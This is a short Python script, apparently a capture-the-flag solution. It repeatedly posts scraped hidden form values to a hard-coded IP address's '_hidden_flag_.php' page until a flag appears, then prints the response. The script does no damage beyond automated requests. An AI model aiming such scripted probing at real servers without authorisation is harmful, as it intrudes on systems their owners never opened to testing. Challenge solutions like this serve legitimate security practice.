# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

import requests
from bs4 import BeautifulSoup
import re
import signal

def main():
    web_url = "http://104.199.235.135:31332/_hidden_flag_.php"
    global r
    r = requests.get(web_url)
    while True:
        soup = BeautifulSoup(r.text, "html.parser")
        if len(re.findall("Hmm \.\.\. no flag here!", r.text)) == 0:
            print(soup)
            print(r.headers)
            break;
        input_c = soup.html.body.find("input", {"name": "c"}).get("value")
        input_s = soup.html.body.find("input", {"name": "s"}).get("value")
        r = requests.post(web_url, data = {"c": input_c, "s": input_s})

def signal_handler(signal, frame):
    print(r.text)
    print(r.headers)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
